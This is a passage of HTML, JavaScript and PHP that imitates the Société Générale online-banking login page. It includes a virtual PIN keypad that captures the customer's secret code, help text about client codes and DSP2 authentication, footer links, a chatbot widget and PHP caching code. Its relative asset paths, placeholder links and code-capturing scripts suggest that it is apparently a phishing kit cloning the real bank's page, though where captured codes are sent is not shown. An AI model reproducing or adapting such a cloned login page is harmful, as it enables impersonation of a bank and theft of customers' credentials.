document.getElementById('temoin-nbr4').style.fontSize = "65px";
document.getElementById('temoin-nbr4').style.color = "gray";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length == 5){ 
document.getElementById('temoin-nbr5').innerHTML = ".";
document.getElementById('temoin-nbr5').style.fontSize = "65px";
document.getElementById('temoin-nbr5').style.color = "gray";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length == 6){ 
document.getElementById('temoin-nbr6').innerHTML = ".";
document.getElementById('temoin-nbr6').style.fontSize = "65px";
document.getElementById('temoin-nbr6').style.color = "gray";
document.getElementById('secret-nbr').maxLength = "6";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length >= 7){ 
/*document.getElementById('secret-nbr2').innerHTML = passpass.slice(0,5);*/
document.getElementById('secret-nbr').value = document.getElementById('secret-nbr2').innerHTML;
}

document.getElementById('secret-nbr').maxLength = "6";
setTimeout(function () { temoinNumber(); },60);
}

temoinNumber();

</script>  




 <div id="js-error" tabindex="0" class="auth_error"></div>

</div>
<input type="hidden"  name="Hidden1" id="Hidden1"/>
</div>
<div>
<div id="gda_vk" class="clavier-container dcw_block-element dcw_conteneur_clavier swm-visible">
<div id="img_container" class="img-container">
<img id="img_clavier" class="keyboard dcw_block-element dcw_conteneur_clavier" usemap="#tc_tclavier" src="../assets/img/gen_ui.png">
<div id="hover_touche_4_4" class="hover" onclick="addCode('3');" name="3" value="" style="position: absolute; left: 180px; top: 180px; width: 60px; height: 60px;"></div>
<div id="hover_touche_4_2" class="hover" onclick="addCode('4');" name="4" value="" style="position: absolute; left: 60px; top: 180px; width: 60px; height: 60px;"></div>
<div id="hover_touche_3_4" class="hover" onclick="addCode('8');" name="8" value="" style="position: absolute; left: 180px; top: 120px; width: 60px; height: 60px;"></div>
<div id="hover_touche_3_3" class="hover" onclick="addCode('7');" name="7" value="" style="position: absolute; left: 120px; top: 120px; width: 60px; height: 60px;"></div>
<div id="hover_touche_3_2" class="hover" onclick="addCode('9');" name="9" value="" style="position: absolute; left: 60px; top: 120px; width: 60px; height: 60px;"></div>
<div id="hover_touche_3_1" class="hover" onclick="addCode('0');" name="0" value="" style="position: absolute; left: 0px; top: 120px; width: 60px; height: 60px;"></div>
<div id="hover_touche_2_1" class="hover" onclick="addCode('6');" name="6" value="" style="position: absolute; left: 0px; top: 60px; width: 60px; height: 60px;"></div>
<div id="hover_touche_1_4" class="hover" onclick="addCode('2');" name="2" value="" style="position: absolute; left: 180px; top: 0px; width: 60px; height: 60px;"></div>
<div id="hover_touche_1_3" class="hover" onclick="addCode('5');" name="5" value="" style="position: absolute; left: 120px; top: 0px; width: 60px; height: 60px;"></div>
<div id="hover_touche_1_1" class="hover" onclick="addCode('1');" name="1" value="" style="position: absolute; left: 0px; top: 0px; width: 60px; height: 60px;"></div>
</div>
</div>
</div>

<div class="auth-cs-content-validate">

<button class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable" id="btn-authent" type="submit" aria-label="Valider votre code secret">Valider</button>

<div class="sonore-Keyboard dcw_block-element">
<br>
<style type="text/css">
.buttcolor:hover{color:red;}
.buttcolor{color:black;}
</style>
<button class="buttcolor" style="width:200px !important; background-color: transparent; border: none; font-size: 16px; margin-left: 15px;">Activer le clavier sonore</button>
</div>

</div>
</div>
</div>
</div>
</div>
</div>

</div>

</div>

</div>


</form>
</div>
</section>
</section>
</main>


</DIV>  



  </div>



</div>

</div>


</section>
  <section class="dcw_gb9_core-right">


 

  
<div>

  <div>
<link href="../assets/css/eo2680-style.css" rel="stylesheet">
<div id="swm-content-default">
<p><br>
<strong>Où trouver mon Code Client SG ?</strong></p>

<ul style="list-style-type: disc;">
<li>Si vous étiez client Société Générale, votre Code Client vous a été communiqué lors de la souscription à la Banque à Distance. Il est également indiqué sur vos relevés de comptes.</li>
<li>Si vous étiez client d’une des banques du Groupe Crédit du Nord, votre Code Client SG vous a été envoyé par courrier postal il y a quelques semaines. Il remplace votre ancien identifiant.</li>
</ul>
<strong>Mon Code Secret a-t-il changé avec SG ?</strong><br>
<br>
<span>Vous seul connaissez votre Code Secret.</span>

<ul style="list-style-type: disc; margin-top: 0;">
<li>Si vous étiez client Société Générale, utilisez votre Code Secret habituel.</li>
<li>Si vous étiez client d’une des banques du Groupe Crédit du Nord, utilisez le Code Secret qui vous permettait de vous connecter à votre Banque en Ligne.</li>
</ul>
<strong>Code Client ou Code Secret inconnus ?</strong><br>
<br>
<a style="text-decoration: underline !important" href="#" class="dcw_card-visual_regular-link"><svg aria-hidden=" true="> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Je souhaite obtenir mon Code Client</a><br>
<a style="text-decoration: underline !important" href="#" class="dcw_card-visual_regular-link"><svg aria-hidden=" true="> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Je ne connais pas mon Code Secret</a>

<p>&nbsp;</p>
</div>



<div id="swm-content-oob" style="display:none">
<div class="eo2680-pass">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img src="../assets/img/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
</div>
<!-- #eo2680-card -->

<p class="eo2680-pass--txt"><strong>Comment ça se passe ?</strong><br>
Une demande de connexion est envoyée en temps réel sur votre mobile dans l’Appli Société Générale. Il vous suffit de la valider depuis votre mobile. <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>

<hr>
<p class="eo2680-pass--txt"><strong>Vous avez changé de numéro de téléphone ?</strong><br>
Vous pouvez modifier votre numéro de téléphone en appelant notre serveur vocal au +33 825 007 111 (0,05 eur TTC/min + prix d'un appel) ou en vous rendant dans votre agence. <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Communiquer votre numéro de téléphone Sécurité</a> <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Activer votre t&eacute;l&eacute;phone S&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Activer votre téléphone Sécurité</a></p>

<hr>
<p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)</p>
</div>
<!-- #eo2680-oob --></div>
<!-- #### -->

<div id="swm-content-otp" style="display:none">
<div class="eo2680-oob">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img src="../assets/img/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
</div>
<!-- #eo2680-card -->

<div class="eo2680-card"><span><strong>Le saviez vous ?</strong></span>

<figure><img src="../assets/img/s-curit-renforc-e-2.png"></figure>

<p>Le <strong>Pass Sécurité</strong> disponible dans l’Appli Société Générale vous permet de <strong>valider très simplement</strong> les actions nécessitant une<strong> authentification renforcée</strong>. Plus besoin de mémoriser et saisir le Code Sécurité reçu par SMS : tout se passe instantanément dans l’Appli ! <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>
</div>
<!-- #eo2680-card -->

<p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)</p>
</div>
<!-- #eo2680-otp --></div>

  </div>

</div>
  
  


</section>
<section class="dcw_gb_row dcw_gb_clearfix">
  

 
  
<div>

  <div>
<script type="text/javascript">
  var element = document.querySelector('.rsp_header');
  element.classList.add("js-header-lhs-auth");
</script>

  </div>

</div>
  
  


</section>
</section>
  </main>
<aside class="dcw_msg-banner dcw_msg-banner--info" role="alert" id="cookieDisclaimer" style="display:none">
<div class="dcw_msg-banner_msg-wrapper">
<svg class='dcw_msg-banner_picto-info' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#info'></use></svg>
<p class="dcw_msg-banner_message">
En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cookies pour vous proposer des publicités ciblées adaptées à vos centres d'intérêts et réaliser des statistiques. Pour en savoir plus et paramétrer vos cookies,&nbsp;<span style="font-size: 16px;"><a href="#" class="eip_dcw_main-link">cliquez ici</a></span>.
</p>
<button class="dcw_msg-banner_btn-closed" arial-label="Fermer le message contextuel">
<svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#close-2'></use></svg>
</button>
</div>
</aside><aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
<div class="dcw_msg-banner_msg-wrapper">
<svg class='dcw_msg-banner_picto-info' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#info'></use></svg>
<p class="dcw_msg-banner_message" id="lastConnectionMessage">

</p>
<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed">
<svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#close-2'></use></svg>
</button>
</div>
</aside>



<style>
/* general */
.stl_section{
font-family: 'SourceSansPro';
}
.stl_section{
margin: 0 auto 2.5rem;
width: 100%;
max-width: 1440px;
}
.stl_layout{
margin: 0px auto;
max-width: 76.25rem;
padding: 0px 1rem;
}
[class*="stl"] {
line-height: 1.5;
}
.stl_layout > .stl_title {
margin-bottom: 1.5rem;
text-align: center;
}
.stl_title {
font-family: "Montserrat", arial, sans-serif;
font-weight: 700;
color: rgb(1, 0, 53);
}
.stl_title--2 {
font-size: 1.25rem;
margin: 0px;
line-height: 1.75rem;
}
.stl_title--3 {
font-size: 1rem;
line-height: 1.25rem;
}

/* stl_first_section */
.stl_bloc{
padding: 0 1rem;
}
.stl_card{
min-height: 83px;
position: relative;
display: flex;
flex-direction: column;
margin: 1.5rem auto 0px;
border-radius: 0.25rem;
background-color: #fff;
transition: box-shadow 0.3s ease 0s;
box-shadow: rgba(0, 0, 0, 0.12) 0px 2px 4px 0px;
justify-content: center;
}
.stl_card_content{
display: flex;
-webkit-box-align: center;
align-items: center;
column-gap: 1rem;
padding: 10px;
}
.stl_card_title{
padding-right: 2rem;
width: 100%;
text-align: left;
}
.stl_card_title::after {
content: "";
position: absolute;
top: 50%;
right: 1rem;
z-index: 1;
display: block;
height: 8px;
width: 8px;
border: 2px solid #010035;
border-left: none;
border-top: none;
-webkit-transform: rotate(-45deg) translateY(-50%);
transform: rotate(-45deg) translateY(-50%);
}
.stl_card_title h3.stl_title.stl_title--3{
margin: 0;
}

/* stl_second_section */
.stl_row{
display: flex;
flex-direction: column;
}
ul.stl_col_link_list{
padding-left: 0;
}
.stl_col_icon, .stl_col_link{
max-width: 100%;
margin: 0 auto;
text-align: center;
}
.stl_link_li{
text-decoration: underline;
color: #545454;
font-size: 16px;
display: block;
}
p.stl_card_text{
margin: 0;
color:rgb(1, 0, 53);
}
.stl_second_section .stl_title--3{
margin: 0;
font-size: 1rem;
}
.stl_col_link{
margin-bottom: 27px;
}

@media screen and (min-width: 48rem){
.stl_bottom_content{
padding-bottom: 2.5rem;
}
.stl_section.stl_second_section{
padding-top: 0;
margin: 0 auto;
}
.stl_row{
max-width: 800px;
flex-direction: initial;
margin: 0 auto;
}
.stl_col{
display: flex;
flex: 0 0 50%;
margin: 0 auto;
max-width: 50%;
padding-top: 0;
}
br.mobile{
display: none;
}
ul.stl_col_link_list{
margin: 0;
}
.stl_col_icon, .stl_col_link{
display: flex;
flex-direction: column;
text-align: left;
padding: 0 10px;
margin: 0 !important;
}
.stl_link_li{
margin-bottom: 16px; 
}
.stl_title.stl_title--3 {
margin-top: 0;
}
.stl_col_link{
margin-bottom: 0;
}
.stl_second_section .stl_title--3{
margin-bottom: 20px;
font-size: 1rem;
}
}

@media screen and (min-width: 64rem){
/* general */
.stl_section.stl_first_section{
padding-top: 5rem;
}
.stl_section{
margin-bottom: 5rem;
padding-right: 1rem;
padding-left: 1rem;
}
.stl_layout {
padding: 0px;
}
.stl_layout > .stl_title--2 {
margin-bottom: 2.5rem;
}
.stl_title--2 {
font-size: 2rem;
line-height: 2.5rem;
}
.stl_title--3 {
font-size: 1.25rem;
line-height: 1.75rem;
}
/* stl_second_section */
.stl_card{
width: 594px;
margin: 2rem auto 0px;
}
.stl_card_content{
padding-left: 30px;
}
}
</style>

<div class="stl_bottom_content" style="background-color: #f4f5f6;">
<div class="stl_section stl_first_section">
<div class="stl_layout">
<h2 class="stl_title stl_title--2">Nos autres Espaces Client</h2>
<div class="stl_bloc">
<a class="stl_card" href="#">
<div class="stl_card_content">
<img data-src="../assets/img/SGAvenirStrokedProperties24.svg.svg" height="32" width="32" alt="" class=" ls-is-cached lazyloaded" src="../assets/img/SGAvenirStrokedProperties24.svg">
<div class="stl_card_title">
<h3 class="stl_title stl_title--3">Espace Client Professionnels</h3>
<p class="stl_card_text">Progéliance Net</p>
</div>
</div>
</a>
<a class="stl_card" href="#">
<div class="stl_card_content">
<img data-src="../assets/img/SGAvenirStrokedConseiller24.svg" height="32" width="32" alt="" class=" ls-is-cached lazyloaded" src="../assets/img/SGAvenirStrokedConseiller24.svg">
<div class="stl_card_title">
<h3 class="stl_title stl_title--3">Espace Client Entreprises</h3>
<p class="stl_card_text">Sogecash Net</p>
</div>
</div>
</a>
</div>
</div>
</div>
<div class="stl_section stl_second_section">
<div class="stl_layout">
<h2 class="stl_title stl_title--2">Liens utiles</h2>
<div class="stl_row">
<div class="stl_col">
<div class="stl_col_icon">
<img height="48" width="48" alt="img_carte_bloquee" src="../assets/img/SGAvenirStyledCarteBloquee48.svg">
</div>
<div class="stl_col_link">
<h3 class="stl_title stl_title--3">Urgences carte<br class="mobile"> bancaire</h3>
<ul class="stl_col_link_list">
<li><a class="stl_link_li" href="#" style="text-decoration: underline !important">Faire opposition à votre carte bancaire</a></li>
<li><a class="stl_link_li" href="#" style="text-decoration: underline !important">Verrouiller votre carte bancaire</a></li>
</ul>
</div>
</div>
<div class="stl_col">
<div class="stl_col_icon">
<img height="48" width="48" alt="img_bouclier" src="../assets/img/SGAvenirStyledBouclierSecurite48.svg">
</div>
<div class="stl_col_link">
<h3 class="stl_title stl_title--3">Nos conseils sécurité</h3>
<ul class="stl_col_link_list">
<li><a class="stl_link_li" href="#" style="text-decoration: underline !important">Découvrez le Pass sécurité</a></li>
<li><a class="stl_link_li" href="#" style="text-decoration: underline !important">Guide des bonnes pratiques</a></li>
<li><a class="stl_link_li" href="#" style="text-decoration: underline !important">Voir les menaces identifiées</a></li>
</ul>
</div>
</div>
</div>
</div> 
</div>
</div>


<footer class="dcw_footer" role="contentinfo">
  <div class="dcw_footer-second">
<div class="dcw_footer_container">
  <nav class="dcw_footer-second_nav">
<ul class="dcw_footer-second_list">
  <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="#"><svg class='dcw_footer-second_icon' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#question'></use></svg>
Questions fréquentes
</a></li>
<li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="#"><svg class='dcw_footer-second_icon' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#localisation'></use></svg>
Trouver une agence
</a></li>
<li class="dcw_footer-second_item">
  <div class="dcw_dropdown js-dropdown-light">
<button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites SG</button>
   <svg class='dcw_dropdown_icon' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#arrow-dropdown'></use></svg>
<ul class="dcw_dropdown_list toggle_content">
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Banque privée</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Professionnels</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Entreprises</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Associations</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Économie publique</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Groupe Société Générale</a>
</li>
</ul>
</div></li>
  </ul>
  </nav>
  <ul class="dcw_footer_container dcw_footer-second_social">
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Facebook" href="#" aria-label="Voir le groupe Facebook de la Soci&eacute;t&eacute; G&eacute;n&eacute;rale"><svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#facebook-2'></use></svg>
</a></li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Twitter" href="#" aria-label="Voir le Twitter de la Soci&eacute;t&eacute; G&eacute;n&eacute;rale"><svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20240220183513.svg#twitter-x'></use></svg>
</a></li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Instagram" href="#" aria-label="Voir l' Instagram de la Soci&eacute;t&eacute; G&eacute;n&eacute;rale"><svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#instagram'></use></svg>
</a></li>
</ul>
</div>
  </div>
  <nav class="dcw_footer-third">
<div class="dcw_footer_container">
  <img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" height="30" src="../assets/img/logo-sg-seul.svg" width="150" />
<ul class="dcw_footer-third_list">
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Sécurité</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Nos engagements</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Gestion des Cookies</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Données personnelles</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Documentation et Tarifs</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Résilier une prestation</a>
</li> 
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Informations légales</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Accessibilité Numérique (partiellement conforme)</a>
</li>
</ul>
</div>
  </nav>
  </footer>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: gb9-com2-int,gb9-com4-int,footer-int-without-closing-main, FURL_NAME: /authen/footer, FURL_ID: 1983c1c77d92f510VgnVCM100000030013acRCRD -->

<style type="text/css">
  .butthoverr{background-color: #010035 !important;}
  .butthoverr:hover{background-color: #191970 !important;}
</style>
<script type="text/javascript">
  function but_0_1_2(id){
var idd = id;
if(idd == 0){
   document.getElementById('but-1').style.backgroundcolor = "#010035";
   document.getElementById('but-2').style.backgroundcolor = "#010035";
   document.getElementById('text-1').style.display = "none";
   document.getElementById('text-2').style.display = "none";
}
if(idd == 1){
   document.getElementById('but-1').style.backgroundcolor = "#191970";
   document.getElementById('but-2').style.backgroundcolor = "#010035";
   document.getElementById('text-1').style.display = "block";
   document.getElementById('text-2').style.display = "none";
}
if(idd == 2){
   document.getElementById('but-1').style.backgroundcolor = "#010035";
   document.getElementById('but-2').style.backgroundcolor = "#191970";
   document.getElementById('text-1').style.display = "none";
   document.getElementById('text-2').style.display = "block";
}
  }
</script>
<script id="tc_script__1" type="text/javascript" src="../assets/js/tc_SocieteGenerale_22.js" defer=""></script>

<DIV id="interactWrapper" class="sdcwrapper theme-banque-bddf theme-enseigne-bddf theme-marche-pri enseigne-BDDF marche-PRI theme-media-site-web integrationNGIM sdcContainer interactCSSWrapper" bis_skin_checked="1" style="position: fixed; float: right; right: 0px !important; margin-top: -90%; margin-bottom: -30%; z-index: 200; display: block;">
   <div class="interact-layout" id="content" bis_skin_checked="1">
  <div class="interact-header" bis_skin_checked="1"></div>
  <div class="interact-content" bis_skin_checked="1"></div>
  <div class="interact-popin" bis_skin_checked="1"></div>
  <div class="interact-footer" bis_skin_checked="1"></div>
  <div class="interact-sticky" bis_skin_checked="1">
 <div id="tch_sticky-bar" class="tch_sticky-bar_container" bis_skin_checked="1">
<div class="tch_sticky-contact_bar" bis_skin_checked="1">
   <h3 class="tch_sticky-bar_title" style="display:none">Besoin d'aide</h3>
   <p class="tch_sticky-bar_message" style="display:none">Nos experts vous accompagnent dans le choix de la solution adaptée à vos besoins </p>
   <div class="tch_sticky-bar has-two-icons" bis_skin_checked="1">

<span id="text-1" class="tch_tooltip" style="position: fixed; margin-left: -160px; top: 410px; display: none;">Poser une question à SoBot  </span>
<span id="text-2" class="tch_tooltip" style="position: fixed; margin-left: -120px; top: 480px; display: none;">Prendre rendez-vous  </span>

  <ul class="tch_sticky-bar_list" style="margin-top: -310px;border: none; border-color: transparent;" id="chatoo">
 <li class="tch_sticky-bar_item" style="border: none; border-color: transparent;">
<button id="but-1" class="tch_sticky-bar_btn butthoverr" style="width: 55px !important; height: 70px !important; color: white; border: none; border-color: transparent;" onmouseover="but_0_1_2('1');" onmouseout="but_0_1_2('0');">
   <svg class="tch_sticky-bar_icon" aria-label="Poser une question à SoBot" role="img" focusable="false" style="width: 30px !important; height: 30px !important;">
  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#chatbot"></use>
   </svg>
</button>
 </li>
 <li class="tch_sticky-bar_item" style="border: none; border-color: transparent;">
<button id="but-2" class="tch_sticky-bar_btn butthoverr" style="width: 55px !important; height: 70px !important; color: white; border: none; border-color: transparent;" onmouseover="but_0_1_2('2');" onmouseout="but_0_1_2('0');">
   <svg class="tch_sticky-bar_icon" aria-label="Prendre rendez-vous" role="img" focusable="false"  style="width: 30px !important; height: 30px !important;">
  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#calendar"></use>
   </svg>
</button>
 </li>
  </ul>
   </div>
   <button class="tch_sticky-bar_close" aria-label="Fermer la boite de dialogue" style="display:none">
  <svg class="tch_sticky-bar_icon tch_sticky-bar_icon--close" aria-hidden="true" focusable="false">
 <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#cross-close"></use>
  </svg>
   </button>
</div>
 </div>
 <div id="tch_sticky-contact" class="tch_sticky-contact_container" style="display:none" bis_skin_checked="1"></div>
  </div>
  <div class="interact-chat" bis_skin_checked="1" style="display:none">
 <div aria-grabbed="false" class="tch_chat" bis_skin_checked="1" style="margin-right: 0px; margin-bottom: 0px;">
<div id="tch_chat-bot" style="display:none" bis_skin_checked="1"></div>
 </div>
  </div>
  <div id="interact-fab" class="interact-fab tch_fab" bis_skin_checked="1" style="display:none">
 <div bis_skin_checked="1">
<button class="js_fab_chat tch_fab__btn" aria-label="Ouvrir la fenêtre de tchat">
   <svg class="tch_fab__icon tch_fab__icon--sobot tch_fab__icon--conversation" aria-hidden="true" focusable="false">
  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#fab-contact"></use>
   </svg>
</button>
 </div>
  </div>
  <div class="interact-test" bis_skin_checked="1"></div>
   </div>
</DIV>


<?php 
$contenuCache = ob_get_contents();ob_end_flush();
$fd = fopen("$fichierCache", "w");
if ($fd) {fwrite($fd,$contenuCache);fclose($fd);}} else {readfile('../cache/lsg_index.lsg');echo "\n";}  
?>
<footer id="foot" style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"></footer>
<script src="../assets/js/jQuery.min.affcbf7942d5bedb0785712.js" defer="defer" async="async"></script>
  
  </body>
  </html>
 

